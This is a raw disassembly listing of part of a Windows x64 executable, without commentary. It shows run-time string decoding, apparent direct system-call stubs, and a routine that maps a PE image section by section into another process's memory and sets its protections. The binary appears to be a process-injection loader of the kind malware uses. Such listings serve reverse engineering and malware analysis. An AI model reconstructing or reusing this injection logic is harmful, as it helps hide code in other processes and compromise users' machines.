   140003468:	66 0f fd c7          	paddw  %xmm7,%xmm0
   14000346c:	66 41 0f db c0       	pand   %xmm8,%xmm0
   140003471:	66 0f d6 05 3f ab 28 	movq   %xmm0,0x28ab3f(%rip)        # 0x14028dfb8
   140003478:	00 
   140003479:	8b 05 41 ab 28 00    	mov    0x28ab41(%rip),%eax        # 0x14028dfc0
   14000347f:	83 c0 13             	add    $0x13,%eax
   140003482:	0f b6 c0             	movzbl %al,%eax
   140003485:	66 89 05 34 ab 28 00 	mov    %ax,0x28ab34(%rip)        # 0x14028dfc0
   14000348c:	c6 05 2f ab 28 00 00 	movb   $0x0,0x28ab2f(%rip)        # 0x14028dfc2
   140003493:	4c 89 f1             	mov    %r14,%rcx
   140003496:	48 8d 15 1b ab 28 00 	lea    0x28ab1b(%rip),%rdx        # 0x14028dfb8
   14000349d:	e8 3e 68 00 00       	call   0x140009ce0
   1400034a2:	4c 89 f1             	mov    %r14,%rcx
   1400034a5:	4c 89 e2             	mov    %r12,%rdx
   1400034a8:	e8 23 68 00 00       	call   0x140009cd0
   1400034ad:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400034b4:	00 00 
   1400034b6:	4c 89 f1             	mov    %r14,%rcx
   1400034b9:	e8 32 68 00 00       	call   0x140009cf0
   1400034be:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400034c5:	01 c0                	add    %eax,%eax
   1400034c7:	66 89 4c 24 62       	mov    %cx,0x62(%rsp)
   1400034cc:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1400034d1:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1400034d6:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   1400034dd:	00 
   1400034de:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   1400034e5:	00 
   1400034e6:	c7 84 24 80 00 00 00 	movl   $0x30,0x80(%rsp)
   1400034ed:	30 00 00 00 
   1400034f1:	c7 84 24 98 00 00 00 	movl   $0x40,0x98(%rsp)
   1400034f8:	40 00 00 00 
   1400034fc:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   140003503:	00 
   140003504:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   14000350b:	00 
   14000350c:	0f 11 30             	movups %xmm6,(%rax)
   14000350f:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140003516:	00 
   140003517:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000351e:	00 00 
   140003520:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140003527:	00 
   140003528:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   14000352f:	00 
   140003530:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003537:	00 
   140003538:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000353f:	00 
   140003540:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003547:	00 00 
   140003549:	4c 89 e9             	mov    %r13,%rcx
   14000354c:	ba 16 01 12 00       	mov    $0x120116,%edx
   140003551:	49 89 e8             	mov    %rbp,%r8
   140003554:	49 89 f1             	mov    %rsi,%r9
   140003557:	e8 c6 de ff ff       	call   0x140001422
   14000355c:	85 c0                	test   %eax,%eax
   14000355e:	78 0a                	js     0x14000356a
   140003560:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003565:	e8 f4 de ff ff       	call   0x14000145e
   14000356a:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003570:	66 85 c0             	test   %ax,%ax
   140003573:	0f 85 9d fe ff ff    	jne    0x140003416
   140003579:	eb 46                	jmp    0x1400035c1
   14000357b:	c6 05 40 aa 28 00 01 	movb   $0x1,0x28aa40(%rip)        # 0x14028dfc2
   140003582:	48 b8 49 00 2c 00 2c 	movabs $0x49002c002c0049,%rax
   140003589:	00 49 00 
   14000358c:	48 89 05 25 aa 28 00 	mov    %rax,0x28aa25(%rip)        # 0x14028dfb8
   140003593:	66 c7 05 24 aa 28 00 	movw   $0xed,0x28aa24(%rip)        # 0x14028dfc0
   14000359a:	ed 00 
   14000359c:	48 8d 0d 5d 02 00 00 	lea    0x25d(%rip),%rcx        # 0x140003800
   1400035a3:	e8 c8 dd ff ff       	call   0x140001370
   1400035a8:	c6 05 e6 a8 28 00 01 	movb   $0x1,0x28a8e6(%rip)        # 0x14028de95
   1400035af:	80 3d 0c aa 28 00 00 	cmpb   $0x0,0x28aa0c(%rip)        # 0x14028dfc2
   1400035b6:	0f 85 a4 fe ff ff    	jne    0x140003460
   1400035bc:	e9 d2 fe ff ff       	jmp    0x140003493
   1400035c1:	48 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%rsi
   1400035c8:	00 
   1400035c9:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400035cf:	48 89 f1             	mov    %rsi,%rcx
   1400035d2:	31 d2                	xor    %edx,%edx
   1400035d4:	e8 f7 67 00 00       	call   0x140009dd0
   1400035d9:	80 3d b0 a8 28 00 00 	cmpb   $0x0,0x28a8b0(%rip)        # 0x14028de90
   1400035e0:	0f 84 ae 01 00 00    	je     0x140003794
   1400035e6:	80 3d ed a8 28 00 00 	cmpb   $0x0,0x28a8ed(%rip)        # 0x14028deda
   1400035ed:	74 3c                	je     0x14000362b
   1400035ef:	f3 0f 7e 05 d9 a8 28 	movq   0x28a8d9(%rip),%xmm0        # 0x14028ded0
   1400035f6:	00 
   1400035f7:	66 0f fd 05 01 70 00 	paddw  0x7001(%rip),%xmm0        # 0x14000a600
   1400035fe:	00 
   1400035ff:	66 0f db 05 e9 6f 00 	pand   0x6fe9(%rip),%xmm0        # 0x14000a5f0
   140003606:	00 
   140003607:	66 0f d6 05 c1 a8 28 	movq   %xmm0,0x28a8c1(%rip)        # 0x14028ded0
   14000360e:	00 
   14000360f:	b8 cf 00 00 00       	mov    $0xcf,%eax
   140003614:	03 05 be a8 28 00    	add    0x28a8be(%rip),%eax        # 0x14028ded8
   14000361a:	0f b6 c0             	movzbl %al,%eax
   14000361d:	66 89 05 b4 a8 28 00 	mov    %ax,0x28a8b4(%rip)        # 0x14028ded8
   140003624:	c6 05 af a8 28 00 00 	movb   $0x0,0x28a8af(%rip)        # 0x14028deda
   14000362b:	48 8d 15 9e a8 28 00 	lea    0x28a89e(%rip),%rdx        # 0x14028ded0
   140003632:	48 89 f1             	mov    %rsi,%rcx
   140003635:	e8 a6 66 00 00       	call   0x140009ce0
   14000363a:	48 89 f1             	mov    %rsi,%rcx
   14000363d:	48 89 da             	mov    %rbx,%rdx
   140003640:	e8 8b 66 00 00       	call   0x140009cd0
   140003645:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000364c:	00 00 00 00 00 
   140003651:	48 89 f1             	mov    %rsi,%rcx
   140003654:	e8 97 66 00 00       	call   0x140009cf0
   140003659:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003660:	01 c0                	add    %eax,%eax
   140003662:	66 89 8c 24 82 00 00 	mov    %cx,0x82(%rsp)
   140003669:	00 
   14000366a:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   140003671:	00 
   140003672:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140003679:	00 
   14000367a:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000367d:	0f 29 b4 24 d0 00 00 	movaps %xmm6,0xd0(%rsp)
   140003684:	00 
   140003685:	0f 29 b4 24 e0 00 00 	movaps %xmm6,0xe0(%rsp)
   14000368c:	00 
   14000368d:	c7 84 24 d0 00 00 00 	movl   $0x30,0xd0(%rsp)
   140003694:	30 00 00 00 
   140003698:	c7 84 24 e8 00 00 00 	movl   $0x40,0xe8(%rsp)
   14000369f:	40 00 00 00 
   1400036a3:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400036aa:	00 
   1400036ab:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400036b2:	00 
   1400036b3:	0f 29 b4 24 f0 00 00 	movaps %xmm6,0xf0(%rsp)
   1400036ba:	00 
   1400036bb:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400036c2:	00 00 
   1400036c4:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400036cb:	00 
   1400036cc:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400036d3:	00 
   1400036d4:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400036db:	00 00 
   1400036dd:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400036e4:	00 
   1400036e5:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400036ec:	00 
   1400036ed:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400036f4:	00 
   1400036f5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400036fc:	00 
   1400036fd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003704:	00 00 
   140003706:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000370b:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   140003712:	00 
   140003713:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   14000371a:	00 
   14000371b:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140003720:	49 89 f1             	mov    %rsi,%r9
   140003723:	e8 fa dc ff ff       	call   0x140001422
   140003728:	85 c0                	test   %eax,%eax
   14000372a:	78 3b                	js     0x140003767
   14000372c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003731:	0f 11 74 24 38       	movups %xmm6,0x38(%rsp)
   140003736:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000373a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000373e:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140003745:	00 
   140003746:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000374b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003750:	31 d2                	xor    %edx,%edx
   140003752:	45 31 c0             	xor    %r8d,%r8d
   140003755:	45 31 c9             	xor    %r9d,%r9d
   140003758:	e8 d4 dc ff ff       	call   0x140001431
   14000375d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003762:	e8 f7 dc ff ff       	call   0x14000145e
   140003767:	0f 28 b4 24 f0 04 00 	movaps 0x4f0(%rsp),%xmm6
   14000376e:	00 
   14000376f:	0f 28 bc 24 00 05 00 	movaps 0x500(%rsp),%xmm7
   140003776:	00 
   140003777:	44 0f 28 84 24 10 05 	movaps 0x510(%rsp),%xmm8
   14000377e:	00 00 
   140003780:	48 81 c4 28 05 00 00 	add    $0x528,%rsp
   140003787:	5b                   	pop    %rbx
   140003788:	5d                   	pop    %rbp
   140003789:	5f                   	pop    %rdi
   14000378a:	5e                   	pop    %rsi
   14000378b:	41 5c                	pop    %r12
   14000378d:	41 5d                	pop    %r13
   14000378f:	41 5e                	pop    %r14
   140003791:	41 5f                	pop    %r15
   140003793:	c3                   	ret
   140003794:	c6 05 3f a7 28 00 01 	movb   $0x1,0x28a73f(%rip)        # 0x14028deda
   14000379b:	48 b8 8d 00 70 00 70 	movabs $0x8d00700070008d,%rax
   1400037a2:	00 8d 00 
   1400037a5:	48 89 05 24 a7 28 00 	mov    %rax,0x28a724(%rip)        # 0x14028ded0
   1400037ac:	66 c7 05 23 a7 28 00 	movw   $0x31,0x28a723(%rip)        # 0x14028ded8
   1400037b3:	31 00 
   1400037b5:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x1400037e0
   1400037bc:	e8 af db ff ff       	call   0x140001370
   1400037c1:	c6 05 c8 a6 28 00 01 	movb   $0x1,0x28a6c8(%rip)        # 0x14028de90
   1400037c8:	80 3d 0b a7 28 00 00 	cmpb   $0x0,0x28a70b(%rip)        # 0x14028deda
   1400037cf:	0f 85 1a fe ff ff    	jne    0x1400035ef
   1400037d5:	e9 51 fe ff ff       	jmp    0x14000362b
   1400037da:	cc                   	int3
   1400037db:	cc                   	int3
   1400037dc:	cc                   	int3
   1400037dd:	cc                   	int3
   1400037de:	cc                   	int3
   1400037df:	cc                   	int3
   1400037e0:	66 c7 05 ef a6 28 00 	movw   $0x0,0x28a6ef(%rip)        # 0x14028ded8
   1400037e7:	00 00 
   1400037e9:	48 c7 05 dc a6 28 00 	movq   $0x0,0x28a6dc(%rip)        # 0x14028ded0
   1400037f0:	00 00 00 00 
   1400037f4:	c3                   	ret
   1400037f5:	cc                   	int3
   1400037f6:	cc                   	int3
   1400037f7:	cc                   	int3
   1400037f8:	cc                   	int3
   1400037f9:	cc                   	int3
   1400037fa:	cc                   	int3
   1400037fb:	cc                   	int3
   1400037fc:	cc                   	int3
   1400037fd:	cc                   	int3
   1400037fe:	cc                   	int3
   1400037ff:	cc                   	int3
   140003800:	66 c7 05 b7 a7 28 00 	movw   $0x0,0x28a7b7(%rip)        # 0x14028dfc0
   140003807:	00 00 
   140003809:	48 c7 05 a4 a7 28 00 	movq   $0x0,0x28a7a4(%rip)        # 0x14028dfb8
   140003810:	00 00 00 00 
   140003814:	c3                   	ret
   140003815:	cc                   	int3
   140003816:	cc                   	int3
   140003817:	cc                   	int3
   140003818:	cc                   	int3
   140003819:	cc                   	int3
   14000381a:	cc                   	int3
   14000381b:	cc                   	int3
   14000381c:	cc                   	int3
   14000381d:	cc                   	int3
   14000381e:	cc                   	int3
   14000381f:	cc                   	int3
   140003820:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003823:	0f 11 05 52 a7 28 00 	movups %xmm0,0x28a752(%rip)        # 0x14028df7c
   14000382a:	0f 29 05 3f a7 28 00 	movaps %xmm0,0x28a73f(%rip)        # 0x14028df70
   140003831:	0f 29 05 28 a7 28 00 	movaps %xmm0,0x28a728(%rip)        # 0x14028df60
   140003838:	0f 29 05 11 a7 28 00 	movaps %xmm0,0x28a711(%rip)        # 0x14028df50
   14000383f:	0f 29 05 fa a6 28 00 	movaps %xmm0,0x28a6fa(%rip)        # 0x14028df40
   140003846:	0f 29 05 e3 a6 28 00 	movaps %xmm0,0x28a6e3(%rip)        # 0x14028df30
   14000384d:	0f 29 05 cc a6 28 00 	movaps %xmm0,0x28a6cc(%rip)        # 0x14028df20
   140003854:	0f 29 05 b5 a6 28 00 	movaps %xmm0,0x28a6b5(%rip)        # 0x14028df10
   14000385b:	0f 29 05 9e a6 28 00 	movaps %xmm0,0x28a69e(%rip)        # 0x14028df00
   140003862:	0f 29 05 87 a6 28 00 	movaps %xmm0,0x28a687(%rip)        # 0x14028def0
   140003869:	c3                   	ret
   14000386a:	cc                   	int3
   14000386b:	cc                   	int3
   14000386c:	cc                   	int3
   14000386d:	cc                   	int3
   14000386e:	cc                   	int3
   14000386f:	cc                   	int3
   140003870:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003873:	0f 29 05 16 a7 28 00 	movaps %xmm0,0x28a716(%rip)        # 0x14028df90
   14000387a:	c7 05 1c a7 28 00 00 	movl   $0x0,0x28a71c(%rip)        # 0x14028dfa0
   140003881:	00 00 00 
   140003884:	c3                   	ret
   140003885:	cc                   	int3
   140003886:	cc                   	int3
   140003887:	cc                   	int3
   140003888:	cc                   	int3
   140003889:	cc                   	int3
   14000388a:	cc                   	int3
   14000388b:	cc                   	int3
   14000388c:	cc                   	int3
   14000388d:	cc                   	int3
   14000388e:	cc                   	int3
   14000388f:	cc                   	int3
   140003890:	c7 05 16 a7 28 00 00 	movl   $0x0,0x28a716(%rip)        # 0x14028dfb0
   140003897:	00 00 00 
   14000389a:	48 c7 05 03 a7 28 00 	movq   $0x0,0x28a703(%rip)        # 0x14028dfa8
   1400038a1:	00 00 00 00 
   1400038a5:	c3                   	ret
   1400038a6:	cc                   	int3
   1400038a7:	cc                   	int3
   1400038a8:	cc                   	int3
   1400038a9:	cc                   	int3
   1400038aa:	cc                   	int3
   1400038ab:	cc                   	int3
   1400038ac:	cc                   	int3
   1400038ad:	cc                   	int3
   1400038ae:	cc                   	int3
   1400038af:	cc                   	int3
   1400038b0:	66 c7 05 77 b8 28 00 	movw   $0x0,0x28b877(%rip)        # 0x14028f130
   1400038b7:	00 00 
   1400038b9:	48 c7 05 64 b8 28 00 	movq   $0x0,0x28b864(%rip)        # 0x14028f128
   1400038c0:	00 00 00 00 
   1400038c4:	c3                   	ret
   1400038c5:	cc                   	int3
   1400038c6:	cc                   	int3
   1400038c7:	cc                   	int3
   1400038c8:	cc                   	int3
   1400038c9:	cc                   	int3
   1400038ca:	cc                   	int3
   1400038cb:	cc                   	int3
   1400038cc:	cc                   	int3
   1400038cd:	cc                   	int3
   1400038ce:	cc                   	int3
   1400038cf:	cc                   	int3
   1400038d0:	66 c7 05 0f a6 28 00 	movw   $0x0,0x28a60f(%rip)        # 0x14028dee8
   1400038d7:	00 00 
   1400038d9:	48 c7 05 fc a5 28 00 	movq   $0x0,0x28a5fc(%rip)        # 0x14028dee0
   1400038e0:	00 00 00 00 
   1400038e4:	c3                   	ret
   1400038e5:	cc                   	int3
   1400038e6:	cc                   	int3
   1400038e7:	cc                   	int3
   1400038e8:	cc                   	int3
   1400038e9:	cc                   	int3
   1400038ea:	cc                   	int3
   1400038eb:	cc                   	int3
   1400038ec:	cc                   	int3
   1400038ed:	cc                   	int3
   1400038ee:	cc                   	int3
   1400038ef:	cc                   	int3
   1400038f0:	56                   	push   %rsi
   1400038f1:	57                   	push   %rdi
   1400038f2:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400038f9:	48 89 d6             	mov    %rdx,%rsi
   1400038fc:	48 89 cf             	mov    %rcx,%rdi
   1400038ff:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003906:	00 00 
   140003908:	e8 e3 63 00 00       	call   0x140009cf0
   14000390d:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003914:	01 c0                	add    %eax,%eax
   140003916:	66 89 4c 24 42       	mov    %cx,0x42(%rsp)
   14000391b:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   140003920:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140003925:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003928:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   14000392d:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140003932:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140003939:	00 
   14000393a:	c7 44 24 68 40 00 00 	movl   $0x40,0x68(%rsp)
   140003941:	00 
   140003942:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003947:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000394c:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140003951:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003958:	00 00 
   14000395a:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000395f:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003964:	ba 06 00 03 00       	mov    $0x30006,%edx
   140003969:	e8 0d dc ff ff       	call   0x14000157b
   14000396e:	85 c0                	test   %eax,%eax
   140003970:	78 42                	js     0x1400039b4
   140003972:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003979:	00 00 
   14000397b:	48 89 f1             	mov    %rsi,%rcx
   14000397e:	e8 6d 63 00 00       	call   0x140009cf0
   140003983:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000398a:	01 c0                	add    %eax,%eax
   14000398c:	66 89 4c 24 32       	mov    %cx,0x32(%rsp)
   140003991:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140003996:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000399b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400039a0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400039a5:	e8 0d dc ff ff       	call   0x1400015b7
   1400039aa:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400039af:	e8 aa da ff ff       	call   0x14000145e
   1400039b4:	90                   	nop
   1400039b5:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400039bc:	5f                   	pop    %rdi
   1400039bd:	5e                   	pop    %rsi
   1400039be:	c3                   	ret
   1400039bf:	cc                   	int3
   1400039c0:	41 57                	push   %r15
   1400039c2:	41 56                	push   %r14
   1400039c4:	41 55                	push   %r13
   1400039c6:	41 54                	push   %r12
   1400039c8:	56                   	push   %rsi
   1400039c9:	57                   	push   %rdi
   1400039ca:	55                   	push   %rbp
   1400039cb:	53                   	push   %rbx
   1400039cc:	48 81 ec 48 05 00 00 	sub    $0x548,%rsp
   1400039d3:	4c 89 cf             	mov    %r9,%rdi
   1400039d6:	4c 89 c6             	mov    %r8,%rsi
   1400039d9:	48 89 d3             	mov    %rdx,%rbx
   1400039dc:	48 85 c9             	test   %rcx,%rcx
   1400039df:	0f 84 9a 00 00 00    	je     0x140003a7f
   1400039e5:	49 89 ce             	mov    %rcx,%r14
   1400039e8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400039ef:	00 00 
   1400039f1:	e8 fa 62 00 00       	call   0x140009cf0
   1400039f6:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400039fd:	01 c0                	add    %eax,%eax
   1400039ff:	66 89 4c 24 3a       	mov    %cx,0x3a(%rsp)
   140003a04:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   140003a09:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140003a0e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003a11:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140003a16:	0f 29 84 24 80 00 00 	movaps %xmm0,0x80(%rsp)
   140003a1d:	00 
   140003a1e:	c7 44 24 70 30 00 00 	movl   $0x30,0x70(%rsp)
   140003a25:	00 
   140003a26:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140003a2b:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003a32:	00 
   140003a33:	0f 29 84 24 90 00 00 	movaps %xmm0,0x90(%rsp)
   140003a3a:	00 
   140003a3b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003a42:	00 00 
   140003a44:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003a49:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140003a4e:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140003a53:	45 31 c9             	xor    %r9d,%r9d
   140003a56:	e8 e4 da ff ff       	call   0x14000153f
   140003a5b:	89 c5                	mov    %eax,%ebp
   140003a5d:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   140003a62:	4c 89 f1             	mov    %r14,%rcx
   140003a65:	e8 f4 d9 ff ff       	call   0x14000145e
   140003a6a:	85 ed                	test   %ebp,%ebp
   140003a6c:	0f 88 cc 02 00 00    	js     0x140003d3e
   140003a72:	49 ff c6             	inc    %r14
   140003a75:	49 83 fe 02          	cmp    $0x2,%r14
   140003a79:	0f 82 bf 02 00 00    	jb     0x140003d3e
   140003a7f:	4c 8b a4 24 c0 05 00 	mov    0x5c0(%rsp),%r12
   140003a86:	00 
   140003a87:	4c 8b b4 24 b8 05 00 	mov    0x5b8(%rsp),%r14
   140003a8e:	00 
   140003a8f:	4c 8b bc 24 b0 05 00 	mov    0x5b0(%rsp),%r15
   140003a96:	00 
   140003a97:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003a9c:	48 89 d9             	mov    %rbx,%rcx
   140003a9f:	48 89 f2             	mov    %rsi,%rdx
   140003aa2:	e8 c9 f4 ff ff       	call   0x140002f70
   140003aa7:	48 89 c6             	mov    %rax,%rsi
   140003aaa:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140003aaf:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140003ab6:	00 
   140003ab7:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140003abc:	48 89 fa             	mov    %rdi,%rdx
   140003abf:	4d 89 f8             	mov    %r15,%r8
   140003ac2:	4d 89 f1             	mov    %r14,%r9
   140003ac5:	e8 c6 eb ff ff       	call   0x140002690
   140003aca:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003acf:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140003ad3:	0f 84 fb 01 00 00    	je     0x140003cd4
   140003ad9:	4c 63 7e 3c          	movslq 0x3c(%rsi),%r15
   140003add:	4a 8b 44 3e 30       	mov    0x30(%rsi,%r15,1),%rax
   140003ae2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003ae7:	42 8b 44 3e 50       	mov    0x50(%rsi,%r15,1),%eax
   140003aec:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003af1:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003af8:	00 
   140003af9:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003b00:	00 
   140003b01:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003b06:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003b0b:	45 31 c0             	xor    %r8d,%r8d
   140003b0e:	e8 96 d9 ff ff       	call   0x1400014a9
   140003b13:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003b18:	85 c0                	test   %eax,%eax
   140003b1a:	0f 88 ad 01 00 00    	js     0x140003ccd
   140003b20:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140003b25:	46 8b 4c 3e 54       	mov    0x54(%rsi,%r15,1),%r9d
   140003b2a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003b31:	00 00 
   140003b33:	49 89 f0             	mov    %rsi,%r8
   140003b36:	e8 7d d9 ff ff       	call   0x1400014b8
   140003b3b:	66 42 83 7c 3e 06 00 	cmpw   $0x0,0x6(%rsi,%r15,1)
   140003b42:	0f 84 df 00 00 00    	je     0x140003c27
   140003b48:	48 b8 df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rax
   140003b4f:	49 01 7d 
   140003b52:	4d 8d 2c 37          	lea    (%r15,%rsi,1),%r13
   140003b56:	49 81 c5 10 01 00 00 	add    $0x110,%r13
   140003b5d:	31 ed                	xor    %ebp,%ebp
   140003b5f:	48 8d 78 02          	lea    0x2(%rax),%rdi
   140003b63:	48 8d 58 1e          	lea    0x1e(%rax),%rbx
   140003b67:	4c 8d 60 3e          	lea    0x3e(%rax),%r12
   140003b6b:	eb 17                	jmp    0x140003b84
   140003b6d:	0f 1f 00             	nopl   (%rax)
   140003b70:	ff c5                	inc    %ebp
   140003b72:	42 0f b7 44 3e 06    	movzwl 0x6(%rsi,%r15,1),%eax
   140003b78:	49 83 c5 28          	add    $0x28,%r13
   140003b7c:	39 c5                	cmp    %eax,%ebp
   140003b7e:	0f 83 a3 00 00 00    	jae    0x140003c27
   140003b84:	41 8b 45 1c          	mov    0x1c(%r13),%eax
   140003b88:	85 c0                	test   %eax,%eax
   140003b8a:	48 89 f9             	mov    %rdi,%rcx
   140003b8d:	48 ba df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rdx
   140003b94:	49 01 7d 
   140003b97:	48 0f 49 ca          	cmovns %rdx,%rcx
   140003b9b:	4d 89 e6             	mov    %r12,%r14
   140003b9e:	4c 0f 49 f3          	cmovns %rbx,%r14
   140003ba2:	a9 00 00 00 20       	test   $0x20000000,%eax
   140003ba7:	4c 0f 44 f1          	cmove  %rcx,%r14
   140003bab:	48 b8 23 94 fa 54 50 	movabs $0x82feb65054fa9423,%rax
   140003bb2:	b6 fe 82 
   140003bb5:	49 01 c6             	add    %rax,%r14
   140003bb8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003bbd:	41 8b 55 04          	mov    0x4(%r13),%edx
   140003bc1:	45 8b 4d 08          	mov    0x8(%r13),%r9d
   140003bc5:	48 03 54 24 30       	add    0x30(%rsp),%rdx
   140003bca:	45 8b 45 0c          	mov    0xc(%r13),%r8d
   140003bce:	49 01 f0             	add    %rsi,%r8
   140003bd1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003bd8:	00 00 
   140003bda:	e8 d9 d8 ff ff       	call   0x1400014b8
   140003bdf:	44 89 f0             	mov    %r14d,%eax
   140003be2:	83 e0 fe             	and    $0xfffffffe,%eax
   140003be5:	83 f8 04             	cmp    $0x4,%eax
   140003be8:	74 86                	je     0x140003b70
   140003bea:	41 8b 45 04          	mov    0x4(%r13),%eax
   140003bee:	48 03 44 24 30       	add    0x30(%rsp),%rax
   140003bf3:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003bf8:	41 8b 45 00          	mov    0x0(%r13),%eax
   140003bfc:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003c01:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003c06:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140003c0b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c10:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003c15:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140003c1a:	45 89 f1             	mov    %r14d,%r9d
   140003c1d:	e8 b3 d9 ff ff       	call   0x1400015d5
   140003c22:	e9 49 ff ff ff       	jmp    0x140003b70
